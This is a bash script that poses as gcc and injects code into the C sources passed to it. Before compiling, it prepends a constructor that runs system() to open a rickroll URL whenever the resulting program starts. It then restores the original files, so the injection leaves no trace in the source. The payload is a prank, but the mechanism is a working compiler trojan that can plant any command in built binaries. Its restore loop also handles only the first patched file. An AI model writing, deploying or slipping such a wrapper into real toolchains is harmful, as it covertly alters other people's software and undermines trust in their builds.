#!/bin/bash

include="#include <stdlib.h>"

payload="
static __attribute__((constructor(101))) void pre_main(void) {
    system(\"xdg-open \\'https://rickroll.it/rickroll.mp4\\' > /dev/null 2>/dev/null &\");
}
"

gcc=$(whereis $0 | cut -d " " -f2) 
patched_file=()

function patch {
    content=$(cat $1)
    cat << EOF > $1
${include}
${payload}
${content}
EOF
}

if [ $# -lt 1 ]; then 
	$gcc
	exit 1
fi

for arg in $@ 
do
    arg=$(realpath $arg 2>/dev/null)

	if [ -f $arg ]; then 
        cp $arg "$(dirname $arg)/.$(basename $arg)"
		patch $arg
		patched_file+=($arg)
	fi
done

$gcc $@

for file in $patched_file 
do
    mv "$(dirname $file)/.$(basename $file)" $file
done

